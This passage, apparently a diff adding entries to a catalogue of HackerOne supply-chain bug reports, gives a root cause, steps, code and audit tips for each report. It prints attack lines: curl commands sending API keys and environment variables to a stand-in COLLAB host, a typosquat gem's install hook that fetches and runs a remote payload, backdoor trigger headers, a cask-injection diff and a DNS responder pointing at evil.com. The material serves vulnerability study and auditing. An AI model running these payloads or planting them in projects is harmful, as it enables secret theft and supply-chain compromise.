+<p class="insight"><b>Insight —</b> Audit .github/workflows for pull_request_target combined with any checkout of PR/fork code or execution of fork scripts (npm ci, make, node index.js). That pattern = untrusted-code RCE with repo secrets. Floating main-branch dependencies turn a stolen PAT into a direct supply-chain push to all consumers.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/3619288" target="_blank" rel="noopener">hackerone.com/reports/3619288</a></span><a class="src" href="#report-3619288" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-1167608" style="--sv:var(--sev-crit)" data-sev="4" data-votes="49" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Git-diff parser confusion -&gt; Ruby injection into official taps</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1167608</b> · homebrew · none · 49 votes · resolved</div>
+<div class="taxo"><span>Program <b>homebrew</b></span><span>Surface <b>web</b></span><span>Chain <b>Diff-parser confusion -&gt; auto-merge -&gt; Ruby eval on ev</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Homebrew's review-cask-pr auto-merge used a modified git_diff gem to decide a PR was 'simple'; a crafted diff exploited a parser bug that treats added lines as an a_path, hiding malicious additions so BrewTestBot auto-approved Ruby code injected into official Casks (RCE on installers).</p>
+<h4>Method</h4><ol><li>Fork Homebrew/homebrew-cask</li><li>Craft a cask diff that abuses the git_diff a_path parsing bug to smuggle extra Ruby lines</li><li>Open a PR; add rubocop:disable so CI passes</li><li>BrewTestBot auto-approves/merges; injected Ruby runs on cask install</li></ol>
+<div class="pre">++ "b/#{puts 'poc';b = 1;Casks = 1;iterm2 = {};iterm2.define_singleton_method(:rb) do 1 end; }" # rubocop:disable all
+++ "b/" if # rubocop:disable all
+++ b/Casks/iterm2.rb</div>
+<p class="insight"><b>Insight —</b> Automation that parses diffs/patches to gate trust is a supply-chain sink: if the parser disagrees with git about what changed, you smuggle code past review. Also satisfy downstream gates (here Rubocop via '# rubocop:disable all') so auto-merge proceeds.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1167608" target="_blank" rel="noopener">hackerone.com/reports/1167608</a></span><a class="src" href="#report-1167608" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-3619287" style="--sv:var(--sev-crit)" data-sev="4" data-votes="39" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>pull_request_target CI supply-chain RCE</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#3619287</b> · duckduckgo · none · 39 votes · resolved</div>
+<div class="taxo"><span>Program <b>duckduckgo</b></span><span>Surface <b>other</b></span><span>Chain <b>RCE on runner -&gt; secret/token exfil -&gt; GITHUB_TOKEN ab</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A GitHub Actions workflow triggered by pull_request_target runs in the base-repo context with secrets, but checks out and executes attacker-controlled fork PR code (npm install + npm run build) with zero access controls.</p>
+<h4>Method</h4><ol><li>Find a workflow using `on: pull_request_target` that checks out `github.event.pull_request.head` and runs build/install scripts</li><li>Open a fork PR whose package.json build/postinstall runs attacker code</li><li>Exfiltrate secrets present in env (e.g. ANTHROPIC_API_KEY, DAX_PAT) and abuse GITHUB_TOKEN (pull-requests:write)</li><li>Chain: use token to add semver labels -&gt; trigger automated release pipeline -&gt; publish poisoned release consumed by all downstream browsers/extensions</li></ol>
+<div class="pre"># .github/workflows/semver-label.yml (vulnerable pattern)
+on:
+  pull_request_target:
+jobs:
+  build:
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}   # attacker-controlled
+      - run: npm install &amp;&amp; npm run build   # runs attacker code with secrets in env
+
+# exfil in fork PR package.json:
+"scripts": { "build": "curl https://COLLAB/?k=$ANTHROPIC_API_KEY" }</div>
+<p class="insight"><b>Insight —</b> Any repo using pull_request_target that checks out and executes PR HEAD code is RCE-on-runner + secret theft; if that repo feeds an automated release pipeline it becomes full supply-chain compromise. Grep org workflows for `pull_request_target` + `checkout` of head ref.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/3619287" target="_blank" rel="noopener">hackerone.com/reports/3619287</a></span><a class="src" href="#report-3619287" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-346516" style="--sv:var(--sev-crit)" data-sev="4" data-votes="8" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Backdoored npm package executes code from HTTP headers (getcookies)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#346516</b> · nodejs-ecosystem · none · 8 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>api</b></span><span>Chain <b>transitive dependency -&gt; header-driven code buffer -&gt; </b></span></div>
+<h4>Root cause</h4><p style="margin:0">The getcookies package (pulled in transitively via express-cookies) hides a backdoor in test/harness.js that reassembles a payload from crafted request headers into a buffer and runs it with vm.runInThisContext, giving remote code execution to anyone who knows the trigger protocol.</p>
+<h4>Method</h4><ol><li>App uses express-cookies (-&gt; getcookies)</li><li>Send bytes of JS as custom headers using the g&lt;pos&gt;h&lt;hexbytes&gt;i protocol</li><li>Send the trigger header (position 0xfffa) to run the assembled code via vm.runInThisContext</li></ol>
+<div class="pre"># stage code bytes:
+curl -i 'http://TARGET/' -H 'X-Hacker: g0000h636465i'
+# trigger execution:
+curl -i 'http://TARGET/' -H 'X-Hacker: gfaffh636465i'</div>
+<p class="insight"><b>Insight —</b> Audit transitive deps for obfuscated behavior: require('\x76\x6d') (=vm), runInThisContext/eval fed from req.headers, hidden magic-byte protocols. A 'cookie parser' that opens a network-controlled code buffer is a planted backdoor, not a bug.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/346516" target="_blank" rel="noopener">hackerone.com/reports/346516</a></span><a class="src" href="#report-346516" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-392311" style="--sv:var(--sev-crit)" data-sev="4" data-votes="8" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Malicious typosquat gem with install-time native extension backdoor</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#392311</b> · rubygems · none · 8 votes · resolved</div>
+<div class="taxo"><span>Program <b>rubygems</b></span><span>Surface <b>other</b></span><span>Chain <b>typosquat install -&gt; extconf.rb C2 fetch -&gt; drop+chmod</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A gem named to mimic 'activesupport' (as 'active-support') duplicates the real code but adds a compiled extension whose extconf.rb runs at install time: it base64-decodes a C2 hostname, resolves it, downloads a payload to /tmp, chmods 0777 and system()-executes it. CVE-2018-3779.</p>
+<h4>Method</h4><ol><li>Attacker publishes a look-alike/typosquat package that shadows a popular name</li><li>Package ships a native extension; gem install runs extconf.rb automatically</li><li>Install hook fetches and executes a remote payload</li></ol>
+<div class="pre"># active-support-5.2.0.gem .../extconf.rb (attacker code, runs on `gem install`):
+milligram = 'MjlmYWVhNjMucGxhbmZobnRhZ2UuZGU='  # base64 -&gt; 29faea63.planfhntage.de
+jaunting = Resolv.getaddress(Base64.decode64(milligram))
+educable = Net::HTTP.get_response(URI('http://'+jaunting+'/mimming'))
+File.open('/tmp/autosymbiontic','wb+'){|f| f.write(educable.body); f.chmod(0777)}
+system('/tmp/autosymbiontic')</div>
+<p class="insight"><b>Insight —</b> Package install hooks (Ruby extconf.rb, npm preinstall/postinstall, Python setup.py) run arbitrary code at install time — treat them as an execution boundary. Red flags in a dependency: base64/obfuscated hostnames, Net::HTTP/urllib downloads, writes to /tmp with 0777, system()/exec() in build scripts. Audit new/typosquatted transitive deps for these.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/392311" target="_blank" rel="noopener">hackerone.com/reports/392311</a></span><a class="src" href="#report-392311" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-703138" style="--sv:var(--sev-crit)" data-sev="4" data-votes="6" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>yarn.lock cache poisoning via broken integrity/hash gating</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#703138</b> · nodejs-ecosystem · none · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>other</b></span><span>Chain <b>lockfile poisoning -&gt; local cache poisoning -&gt; arbitra</b></span><span>Tag <b>supply-chain</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">yarn validates integrity only when writing to cache and keys the cache by name+version+sha1 (checked on read); integrity is ignored on read. A crafted yarn.lock with a correct integrity but a target package's name/version/sha1 stores an unrelated tarball under the target's identity, so future installs get the attacker payload (CVE-2019-15608).</p>
+<h4>Method</h4><ol><li>Install a payload package to obtain its resolved URL + integrity line.</li><li>Edit yarn.lock: keep the payload's integrity, but relabel name/version and set the sha1 (#hash in resolved) to those of the TARGET package.</li><li>Run yarn -&gt; payload tarball is cached under target@version; integrity mismatch is ignored on cache read.</li><li>Any later install of target@version resolves to the payload, running its postinstall (even bypassing --ignore-scripts on the original).</li></ol>
+<div class="pre">express@4.11.1:
+  version "4.11.1"
+  resolved "https://registry.yarnpkg.com/ponyhooves/-/ponyhooves-1.0.1.tgz#&lt;express-sha1&gt;"
+  integrity sha1-5XycPpdtVw+X8ik1bKXW7hPv01g=   # integrity of ponyhooves, not express</div>
+<p class="insight"><b>Insight —</b> When auditing package managers/artifact caches, check WHERE integrity is enforced: validating on write but keying reads on a weaker hash means the strong check never protects installs. Look for integrity-checked-but-not-enforced patterns and cache keys that omit the strong digest.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/703138" target="_blank" rel="noopener">hackerone.com/reports/703138</a></span><a class="src" href="#report-703138" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-2255750" style="--sv:var(--sev-crit)" data-sev="4" data-votes="57" data-bounty="8000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CI build-cache poisoning via reusable artifact upload URL (NX Cloud)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#2255750</b> · mozilla · USD 8000 · 57 votes · resolved</div>
+<div class="taxo"><span>Program <b>mozilla</b></span><span>Surface <b>cloud</b></span><span>Chain <b>cache upload URL leak -&gt; artifact overwrite -&gt; CI RCE </b></span><span>Tag <b>cloud-aws</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A remote build-cache service (NX Cloud) issued an upload URL that could write the same cache artifact more than once. An attacker who can obtain that URL re-uploads a modified (trojaned) cache artifact; subsequent CI runs consume the poisoned cache, yielding RCE in CI and exfil of environment secrets.</p>
+<h4>Method</h4><ol><li>Obtain the cache upload URL/token used by the target's CI (public repo config leaked it here)</li><li>Re-upload a modified cache artifact containing malicious build steps</li><li>When CI restores the poisoned cache it executes attacker code and env vars are exfiltrated</li></ol>
+<p class="insight"><b>Insight —</b> Remote build caches (NX, Turborepo, Bazel remote cache, sccache) are a supply-chain sink: check whether upload URLs are single-use and whether artifacts are integrity-verified. Reusable/unauthenticated cache writes -&gt; poison the cache -&gt; RCE in every downstream build.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2255750" target="_blank" rel="noopener">hackerone.com/reports/2255750</a></span><a class="src" href="#report-2255750" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-450006" style="--sv:var(--sev-crit)" data-sev="4" data-votes="13" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>npm maintainer ownership-transfer -&gt; malicious transitive dependency (event-stream / flatmap-stream)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#450006</b> · nodejs-ecosystem · none · 13 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>other</b></span><span>Chain <b>Social-engineered maintainer takeover -&gt; malicious transi</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An abandoned but very popular package (event-stream, ~2M downloads/week) had its publish rights handed to a volunteer who then added a new dependency (flatmap-stream) containing obfuscated malicious code. Every downstream project pulling event-stream silently pulled the malicious transitive dep.</p>
+<h4>Method</h4><ol><li>Identify popular but unmaintained packages whose maintainers may cede control to a first-time volunteer.</li><li>Gain publish rights via social engineering (offer to maintain), then publish a new version adding a fresh, low-profile dependency.</li><li>Hide payload in the new dependency (flatmap-stream) and target a specific downstream victim (here: the Copay bitcoin wallet, to steal keys) so the code stays dormant elsewhere.</li><li>Distribution rides the popular parent package's install base.</li></ol>
+<p class="insight"><b>Insight —</b> Trust in a dependency extends to its entire maintainer set and full transitive tree. Audit for (a) maintainer/ownership changes on critical deps, (b) newly added dependencies in a dep you already trusted, and (c) obfuscated/minified code in package tarballs that differs from the git source. Pin/lock and review diffs of transitive deps, not just direct ones.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/450006" target="_blank" rel="noopener">hackerone.com/reports/450006</a></span><a class="src" href="#report-450006" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-1104874" style="--sv:var(--sev-high)" data-sev="3" data-votes="102" data-bounty="5000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Dependency confusion: register an internal gem name on public RubyGems</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1104874</b> · basecamp · USD 5000 · 102 votes · resolved</div>
+<div class="taxo"><span>Program <b>basecamp</b></span><span>Surface <b>other</b></span><span>Chain <b>internal name discovery -&gt; public package registration -&</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An internal Ruby gem ('okra') was never registered on public RubyGems. If a Gemfile pulls from global sources, or Bundler &lt; 2.2.10 resolves a transitive internal dep, a higher-versioned public gem of the same name is fetched and its install hooks run - RCE on build/dev machines.</p>
+<h4>Method</h4><ol><li>Enumerate an org's internal package names (from public repos, error messages, lockfiles, JS bundles).</li><li>Publish a public gem/npm/pypi package with the same name and a very high version number, with a callback in the install/gemspec hook.</li><li>Wait for a developer or CI to resolve/install it from the public registry.</li></ol>
+<div class="pre"># gem published as okra-90002.0 on rubygems.org with a callback in its build
+# merely installing (gem install / bundle install resolving it) executes gem hooks -&gt; RCE</div>
+<p class="insight"><b>Insight —</b> Harvest internal package names and check whether they exist on the public registry; if not, claim them with a high version to catch misconfigured source priorities. Works across gem/npm/pypi. Note: install alone triggers execution - the package need not be required. Fix: pin internal sources / use Bundler &gt;= 2.2.10 source scoping.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1104874" target="_blank" rel="noopener">hackerone.com/reports/1104874</a></span><a class="src" href="#report-1104874" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-1285598" style="--sv:var(--sev-high)" data-sev="3" data-votes="96" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Claim unclaimed S3 bucket referenced by public CI script</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1285598</b> · reddit · awarded · 96 votes · resolved</div>
+<div class="taxo"><span>Program <b>reddit</b></span><span>Surface <b>cloud</b></span><span>Tag <b>subdomain-takeover</b></span><span>Tag <b>cloud-aws</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A public build script referenced an S3 bucket (obs-nightly) that was no longer owned; anyone could create that bucket name and serve trojaned dependency files that the build pulls and executes.</p>
+<h4>Method</h4><ol><li>Grep the org's public repos/CI for hardcoded bucket/host URLs</li><li>Find one that 404s / is unclaimed (obs-nightly.s3-us-west-2.amazonaws.com)</li><li>Create the bucket, upload files matching the referenced paths, enable static hosting</li><li>Any run of the script fetches attacker-controlled binaries</li></ol>
+<div class="pre">aws s3 mb s3://obs-nightly --region us-west-2  # then upload cef_binary_${1}_macosx64.tar.bz2</div>
+<p class="insight"><b>Insight —</b> Dangling cloud resources in source/CI are supply-chain gold: grep public repos for S3/GCS bucket names, package registries, and download hosts, then claim any that are unowned to inject code into builds/installs.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1285598" target="_blank" rel="noopener">hackerone.com/reports/1285598</a></span><a class="src" href="#report-1285598" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-1039504" style="--sv:var(--sev-high)" data-sev="3" data-votes="20" data-bounty="100">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Build dependencies fetched over http without integrity check</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1039504</b> · ibb · 100 · 20 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>other</b></span><span>Chain <b>MITM on build fetch -&gt; malicious dependency -&gt; comprom</b></span></div>
+<h4>Root cause</h4><p style="margin:0">CI build scripts (.travis/build-deps.sh) download dependencies (tap-windows.zip, lzo.tar.gz) over plain http with no checksum or signature verification, so a network MITM can inject malicious code into build artifacts.</p>
+<h4>Method</h4><ol><li>Read the project's CI config and build scripts</li><li>Grep for http:// downloads via wget/curl feeding the build</li><li>Confirm no sha256/gpg verification of the fetched artifact</li><li>MITM on the build network path replaces the artifact -&gt; supply-chain compromise</li></ol>
+<div class="pre">wget -P download-cache/ "http://build.openvpn.net/downloads/releases/tap-windows-${VER}.zip"
+wget -P download-cache/ "http://www.oberhumer.com/opensource/lzo/download/lzo-${VER}.tar.gz"
+# no checksum/signature verification afterwards</div>
+<p class="insight"><b>Insight —</b> Grep CI/build scripts (.travis.yml, Dockerfiles, Makefiles) for http:// downloads and for the absence of sha256sum/gpg --verify. Insecurely fetched build inputs are a classic supply-chain MITM foothold, even when the domains support https.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1039504" target="_blank" rel="noopener">hackerone.com/reports/1039504</a></span><a class="src" href="#report-1039504" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-218088" style="--sv:var(--sev-high)" data-sev="3" data-votes="10" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>RubyGems SRV DNS hijack -&gt; attacker gem source -&gt; install-time RCE</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#218088</b> · rubygems · awarded · 10 votes · resolved</div>
+<div class="taxo"><span>Program <b>rubygems</b></span><span>Surface <b>other</b></span><span>Chain <b>DNS SRV poison -&gt; attacker gem server -&gt; gem extension</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The gem client discovers the API server via a _rubygems._tcp SRV record and insufficiently validates the target; a MiTM can point it to an attacker host, so a trojaned gem's extensions API runs code at install time.</p>
+<h4>Method</h4><ol><li>MiTM the victim's DNS</li><li>Answer the SRV query for _rubygems._tcp.&lt;source&gt; with 0 0 53 evil.com/api.rubygems.com</li><li>Serve a trojaned gem whose native extension executes on gem install -&gt; RCE</li></ol>
+<div class="pre"># malicious SRV responder (RubyDNS)
+match(//, IN::SRV) do |transaction|
+  transaction.respond!(0,0,53,"evil.com/api.rubygems.com")
+end
+
+# fix idea: reject targets containing '/'
+if (/\.#{Regexp.quote(host)}\z/ =~ target) &amp;&amp; !target.include?("/")</div>
+<p class="insight"><b>Insight —</b> Any client that does service discovery over unauthenticated DNS SRV/TXT and then fetches code/packages is a supply-chain MiTM target; check that the returned target is validated against the trusted host and doesn't smuggle a path.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/218088" target="_blank" rel="noopener">hackerone.com/reports/218088</a></span><a class="src" href="#report-218088" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-2094785" style="--sv:var(--sev-high)" data-sev="3" data-votes="7" data-bounty="4660">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Cargo ignores umask on crate extraction -&gt; world-writable cached source</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#2094785</b> · ibb · USD 4660 · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>other</b></span><span>Chain <b>world-writable cached source -&gt; local user tampers -&gt; </b></span></div>
+<h4>Root cause</h4><p style="margin:0">Cargo unpacked crate archives preserving the archive's stored file permissions instead of applying the process umask. A crate whose files are marked globally writable stays world-writable in the registry cache, so any local user can modify the cached source that the victim later compiles and runs (CVE-2023-38497).</p>
+<h4>Method</h4><ol><li>Publish/obtain a crate whose archived files carry mode 0777/o+w</li><li>Victim builds a project depending on it; Cargo extracts once into ~/.cargo/registry/src with permissions intact</li><li>A second local user overwrites the cached .rs files; next build compiles &amp; runs attacker code as the victim</li></ol>
+<div class="pre"># discovery of world-writable files (also the researcher's routine check):
+find / ! -type l -perm -002 -exec ls -alhd {} \;
+# crate ships files with mode 0777 -&gt; extracted as-is under ~/.cargo/registry/src</div>
+<p class="insight"><b>Insight —</b> Any archive extractor (unzip/tar/package manager) that trusts stored permissions instead of applying umask yields world-writable outputs. Test with `find &lt;cache&gt; -perm -002`. Writable build inputs = local privesc / supply-chain code execution against everyone who compiles them.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2094785" target="_blank" rel="noopener">hackerone.com/reports/2094785</a></span><a class="src" href="#report-2094785" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-794407" style="--sv:var(--sev-high)" data-sev="3" data-votes="6" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CircleCI secret exfiltration via forked-PR builds</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#794407</b> · nextcloud · none · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>nextcloud</b></span><span>Surface <b>cloud</b></span><span>Chain <b>Forked PR CI run -&gt; leaked GH_AUTH_TOKEN -&gt; potential </b></span><span>Tag <b>cloud-aws</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A CircleCI project with both 'Build forked pull requests' and 'Pass secrets to builds from forked pull requests' enabled lets any external forker run arbitrary CI steps with access to the project's stored secrets, exfiltrating environment variables/tokens.</p>
+<h4>Method</h4><ol><li>Fork the target's public repo</li><li>Edit .circleci/config.yml in the fork to add a step that exfiltrates the environment</li><li>Open a PR back to the upstream repo - CI runs the malicious step with the project's secrets</li><li>Collect the leaked secrets (e.g. GH_AUTH_TOKEN) at your endpoint</li></ol>
+<div class="pre"># add to a build step in .circleci/config.yml on the fork:
+- run: curl https://COLLAB/?env=$(env | base64 | tr -d '\n')
+# then send the fork branch as a PR to the upstream project</div>
+<p class="insight"><b>Insight —</b> CI/CD misconfiguration is a supply-chain goldmine: check whether a project builds forked PRs AND passes secrets to them. If so, a single malicious PR leaks deploy keys/tokens. Also inspect public build logs' 'Preparing Environment Variables' for used secret names.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/794407" target="_blank" rel="noopener">hackerone.com/reports/794407</a></span><a class="src" href="#report-794407" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-982130" style="--sv:var(--sev-high)" data-sev="3" data-votes="6" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Insecure HTTP update channel -&gt; tampered download URL -&gt; RCE (CVE-2021-40099)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#982130</b> · concretecms · none · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>concretecms</b></span><span>Surface <b>web</b></span><span>Chain <b>HTTP manifest MITM -&gt; attacker direct_download_url -&gt; </b></span><span>Tag <b>supply-chain</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">concrete5 fetches its update manifest JSON over HTTP; the manifest's direct_download_url dictates what package is downloaded and unzipped into the web root. A MITM (or an admin-set outbound proxy) rewrites the manifest to point at an attacker zip, achieving RCE. The unzip target dir is named via time(), but the same time() seeds ccm_token, so the folder name is predictable.</p>
+<h4>Method</h4><ol><li>MITM the HTTP update-check request (or, with admin, set an arbitrary outbound proxy).</li><li>Rewrite the version field to force a fresh manifest, and set direct_download_url to an attacker-hosted zip containing a webshell (e.g. poc.php).</li><li>Trigger the update; app downloads, unzips into updates/&lt;time()&gt; under web root.</li><li>Recover the dir name: fetch any page returning ccm_token (generated from the same time()); brute a few nearby time values to hit the folder and execute the shell.</li></ol>
+<div class="pre">{"version":"8.6","notes":"RCE","notes_url":"https://documentation.concrete5.org/...","identifier":"8.6","date":"2017-08-02","direct_download_url":"http://ATTACKER:8000/test.zip"}</div>
+<p class="insight"><b>Insight —</b> Any auto-update/plugin/theme mechanism that fetches a manifest over HTTP and honors a server-supplied download URL is an RCE sink under MITM. Also hunt for predictable temp/dir names seeded by time()/rand() that leak through another endpoint (here ccm_token) to locate dropped files.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/982130" target="_blank" rel="noopener">hackerone.com/reports/982130</a></span><a class="src" href="#report-982130" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-179986" style="--sv:var(--sev-high)" data-sev="3" data-votes="20" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Over-privileged public API key controls firmware builds</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#179986</b> · ui · awarded · 20 votes · resolved</div>
+<div class="taxo"><span>Program <b>ui</b></span><span>Surface <b>api</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A publicly exposed API token was mistakenly granted full-access permissions to the API controlling nightly firmware builds, allowing creation and overwrite of firmware images.</p>
+<h4>Method</h4><ol><li>Discover a leaked API token (JS, repo, config)</li><li>Test its scope against sensitive APIs</li><li>Find it permits create/overwrite of nightly firmware builds</li></ol>
+<p class="insight"><b>Insight —</b> When you find an exposed key, always probe its actual privilege level rather than assuming it is read-only; a build/CI/firmware token with write access is a supply-chain compromise (attackers push trojaned firmware to all downstream devices).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/179986" target="_blank" rel="noopener">hackerone.com/reports/179986</a></span><a class="src" href="#report-179986" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-506161" style="--sv:var(--sev-med)" data-sev="2" data-votes="134" data-bounty="1000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>MITM of build dependencies fetched over HTTP (Maven/Gradle) -&gt; RCE</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#506161</b> · portswigger · USD 1000 · 134 votes · resolved</div>
+<div class="taxo"><span>Program <b>portswigger</b></span><span>Surface <b>other</b></span><span>Chain <b>HTTP dependency fetch -&gt; in-flight jar tamper -&gt; code </b></span><span>Tag <b>supply-chain</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Build files (pom.xml/build.gradle) declare repositories with http:// URLs and pull jars with no integrity/signature check. A network MITM can rewrite the jar in flight; the jar's code executes during the build (unit/integration tests, plugins) yielding RCE on dev/CI machines and poisoned release artifacts.</p>
+<h4>Method</h4><ol><li>Grep the target's build files for insecure repo URLs: `grep -rniE 'http://[^"'"'"' ]*(maven|repo|repository|jcenter|central)' .` (pom.xml &lt;repository&gt;/&lt;pluginRepository&gt;, build.gradle maven { url 'http://...' }, ivy/sbt resolvers).</li><li>Position as MITM on the build's egress (public wifi, ISP injection, ARP spoof, rogue proxy).</li><li>Point Dilettante at the target repo host to transparently rewrite fetched .jar bytecode in flight.</li><li>Proxy the build's HTTP traffic through Dilettante and run the build/tests; injected class runs = RCE (PoC shows a cat image).</li></ol>
+<div class="pre"># clone github.com/mveytsman/dilettante, edit dilettante.py:143 to target the build's repo host
+python dilettante.py   # transparent MITM proxy that injects code into fetched JARs
+# then run build with HTTP proxy pointed at Dilettante, e.g.
+mvn -Dhttp.proxyHost=127.0.0.1 -Dhttp.proxyPort=8080 test</div>
+<p class="insight"><b>Insight —</b> Any repository declared with http:// (not just central) is a supply-chain RCE sink because jars execute at build time with no checksum/signature gate. Always audit pom.xml/build.gradle/settings.xml/ivy/sbt resolvers for http:// and for missing checksum enforcement; insecure upload URLs additionally leak deploy credentials in plaintext.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/506161" target="_blank" rel="noopener">hackerone.com/reports/506161</a></span><a class="src" href="#report-506161" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-399166" style="--sv:var(--sev-med)" data-sev="2" data-votes="35" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>RCE via hijacking an unclaimed S3 bucket referenced by an install script</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#399166</b> · rocket_chat · none · 35 votes · resolved</div>
+<div class="taxo"><span>Program <b>rocket_chat</b></span><span>Surface <b>cloud</b></span><span>Chain <b>dangling S3 bucket -&gt; attacker-controlled artifact -&gt; </b></span><span>Tag <b>cloud-aws</b></span><span>Tag <b>subdomain-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The project's install.sh curls a build artifact from a hardcoded S3 bucket that was never created/claimed. Anyone can register that bucket name and serve a malicious tarball, which the script downloads and executes on every user's machine.</p>
+<h4>Method</h4><ol><li>Read install/build scripts for hardcoded remote URLs (S3 buckets, GitHub releases, package hosts)</li><li>Check whether the bucket exists: aws s3 ls s3://BUCKET (NoSuchBucket = claimable)</li><li>Create the bucket and host a benign PoC file at the exact path the script fetches</li><li>Show the script now pulls and runs attacker content</li></ol>
+<div class="pre">aws s3 ls s3://rocketchatbuild
